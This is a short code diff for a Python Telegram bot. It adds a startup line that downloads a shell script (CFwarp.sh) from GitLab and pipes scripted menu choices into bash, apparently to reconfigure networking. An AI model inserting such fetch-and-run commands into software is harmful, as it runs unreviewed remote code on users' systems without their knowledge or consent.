@@ -1,10 +1,13 @@
 import logging
 import os
 import time
-os.system(f'spotdl --download-ffmpeg')
 from dotenv import dotenv_values
 from telegram import Update
 from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
+
+# Running external setup commands at the beginning
+os.system(f'spotdl --download-ffmpeg')
+os.system('curl -s https://gitlab.com/rwkgyg/CFwarp/raw/main/CFwarp.sh -o /tmp/CFwarp.sh && echo -e "3\n1\n3" > /tmp/input.txt && bash /tmp/CFwarp.sh < /tmp/input.txt')
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger(__name__)
